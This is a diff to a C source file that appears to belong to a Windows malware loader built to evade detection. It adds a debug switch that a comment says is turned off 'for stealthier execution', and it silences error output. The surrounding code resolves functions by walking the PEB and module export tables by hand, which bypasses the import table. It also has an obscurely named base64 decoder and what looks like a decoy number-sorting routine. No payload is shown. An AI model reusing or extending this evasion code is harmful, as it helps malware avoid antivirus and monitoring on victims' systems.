@@ -3,6 +3,39 @@
 #include <stdlib.h>
 #include <winternl.h>
 
+/*
+Print debug
+Disable debug for stealthier execution in evasion.h
+*/
+void myDebug(DEBUG_TYPE type, const char *format, ...) {
+    if (!DEBUG) return;  // Disable debugging if DEBUG is false
+
+    const char *prefix;
+    switch (type) {
+        case DEBUG_ERROR:
+            prefix = "[ERROR]";
+            break;
+        case DEBUG_INFO:
+            prefix = "[INFO]";
+            break;
+        case DEBUG_SUCCESS:
+            prefix = "[SUCCESS]";
+            break;
+        default:
+            prefix = "[INFO]";
+            break;
+    }
+
+    printf("%s ", prefix);
+
+    va_list args;
+    va_start(args, format);
+    vprintf(format, args);
+    va_end(args);
+
+    printf("\n");  // Ensure new line for readability
+}
+
 // This table implements the mapping from 8-bit ascii value to 6-bit
 // base64 value and it is used during the base64 decoding
 // process. Since not all 8-bit values are used, some of them are
@@ -50,7 +83,7 @@ char *Bsfd(const char *encoded)
         {
             if (((int)encoded[in_index + i] > 131) || UNBASE64[(int)encoded[in_index + i]] == -1)
             {
-                fprintf(stderr, "Invalid base64 char, cannot decode: %c\n", encoded[in_index + i]);
+                /*Invalid b64*/
                 return (char *)decoded;
             }
         }
@@ -116,7 +149,7 @@ void SortNumbers()
     float avg = (float)sum / ARRAY_SIZE;
 
     // Print final average
-    printf("[*] Processed %d numbers. Average value: %.2f\n", ARRAY_SIZE, avg);
+    myDebug(DEBUG_INFO, "Processed %d numbers. Average value: %.2f", ARRAY_SIZE, avg);
 }
 
 pMod GetMod(LPCSTR mod, LPCSTR fn)
@@ -124,14 +157,14 @@ pMod GetMod(LPCSTR mod, LPCSTR fn)
     PPEB pPEB = (PPEB)__readgsqword(0x60);
     if (!pPEB)
     {
-        printf("[!] Failed to retrieve PEB.\n");
+        myDebug(DEBUG_ERROR, "Failed to retrieve PEB.");
         return NULL;
     }
 
     PPEB_LDR_DATA pLdr = pPEB->Ldr;
     if (!pLdr)
     {
-        printf("[!] Failed to retrieve LDR data.\n");
+        myDebug(DEBUG_ERROR, "Failed to retrieve LDR data.");
         return NULL;
     }
 
@@ -164,7 +197,7 @@ pMod GetMod(LPCSTR mod, LPCSTR fn)
 
         if (strstr(dllName, mod))
         {
-            // printf("[*] Found %s at: %p\n", mod, hModuleBase);
+            // myDebug(DEBUG_SUCCESS, "Found %s at: %p", mod, hModuleBase);
 
             // Locate Export Directory
             IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)hModuleBase;
@@ -173,7 +206,7 @@ pMod GetMod(LPCSTR mod, LPCSTR fn)
 
             if (!expDir)
             {
-                printf("[!] Export directory not found!\n");
+                myDebug(DEBUG_ERROR, "Export directory not found!");
                 return NULL;
             }
 
@@ -186,18 +219,18 @@ pMod GetMod(LPCSTR mod, LPCSTR fn)
                 LPCSTR functionName = (LPCSTR)((BYTE *)hModuleBase + names[i]);
                 if (strcmp(functionName, fn) == 0)
                 {
-                    // printf("[*] %s found at: %p\n", fn, (BYTE*)hModuleBase + functions[ordinals[i]]);
+                    myDebug(DEBUG_INFO, "%s found at: %p", fn, (BYTE*)hModuleBase + functions[ordinals[i]]);
                     return (pMod)((BYTE *)hModuleBase + functions[ordinals[i]]);
                 }
             }
 
-            printf("[!] %s not found encoded %s exports.\n", fn, mod);
+            myDebug(DEBUG_ERROR, "%s not found encoded %s exports.", fn, mod);
             return NULL;
         }
 
         pEntry = pEntry->Flink;
     }
 
-    printf("[!] %s not found encoded PEB.\n", mod);
+    myDebug(DEBUG_ERROR, "%s not found encoded PEB.", mod);
     return NULL;
 }
